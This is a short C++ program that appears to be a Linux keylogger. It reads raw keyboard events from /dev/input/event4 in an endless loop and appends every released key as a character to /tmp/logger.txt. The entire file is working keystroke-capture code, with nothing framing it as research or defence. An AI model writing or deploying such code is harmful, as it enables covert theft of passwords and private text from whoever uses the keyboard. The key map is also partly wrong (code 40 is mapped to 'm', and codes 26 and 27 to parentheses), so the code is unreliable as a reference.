#include <iostream>
#include <string>
#include <linux/input.h>
#include <fstream>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include <map>

static std::map<int, std::string> characters =
{
	{1, " ESC "},
	{2, "1"},
	{3, "2"},
	{4, "3"},
	{5, "4"},
	{6, "5"},
	{7, "6"},
	{8, "7"},
	{9, "8"},
	{10, "9"},
	{11, "0"},
	{12, "-"},
	{13, "="},
	{14, " BACKSPACE "},
	{15, " TAB "},
	{16, "q"},
	{17, "w"},
	{18, "e"},
	{19, "r"},
	{20, "t"},
	{21, "y"},
	{22, "u"},
	{23, "i"},
	{24, "o"},
	{25, "p"},
	{26, "("},
	{27, ")"},
	{28, "\nENTER\n"},
	{29, " LCTR "},
	{30, "a"},
	{31, "s"},
	{32, "d"},
	{33, "f"},
	{34, "g"},
	{35, "h"},
	{36, "j"},
	{37, "k"},
	{38, "l"},
	{44, "z"},
	{45, "x"},
	{46, "c"},
	{47, "v"},
	{48, "b"},
	{49, "n"},
	{40, "m"},
	{57, " "},
};

int main(int argc, char** argv)
{
	int dev = open("/dev/input/event4", O_RDONLY);
	std::ofstream out_file("/tmp/logger.txt", std::ios::app);

	struct input_event event;
	if (dev == -1)
	{
		out_file << "Error opening /dev/input/event4\n";
		exit(EXIT_FAILURE);
	}

	while (true)
	{
		read(dev, &event, sizeof(event));

		if ((event.type == EV_KEY) &&
				(event.value == 0)) // 0 value means the release action of the key
		{
			out_file << characters[event.code];
		}

		out_file.flush();
	}

	return 0;
}
